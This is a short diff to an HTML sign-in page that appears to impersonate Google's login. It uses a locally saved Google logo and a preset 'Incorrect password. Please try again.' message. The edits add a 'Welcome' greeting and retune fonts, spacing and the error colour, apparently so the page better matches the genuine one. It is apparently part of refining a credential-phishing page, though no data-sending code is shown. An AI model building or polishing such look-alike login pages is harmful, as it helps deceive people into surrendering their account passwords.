@@ -53,8 +53,8 @@ window.ezogetrqbykey=function(b){for(var a=0,g=__ez.a[2].length;a<g;a++)if(__ez.
         
         .form-greetings{
             text-align: center;
-            font-size: 17px;
-            margin-bottom: 15px;
+            font-size: 10px;
+            margin-bottom: 17px;
         }
          
         .form-greetingss{
@@ -236,11 +236,11 @@ attach_ezolpl();
             <img src="./password_files/google_PNG19644.png" alt="logo">
         </div>
         <div class="form-greeting">
-            <span></span>
+            <span>Welcome</span>
         </div>
 
          <div class="form-greetings">
-            <span style="color:#FF0000;text-align:center;">Incorrect password. Please try again.</span>
+            <span style="color:#d93025;text-align:center;">Incorrect password. Please try again.</span>
         </div>
 
        
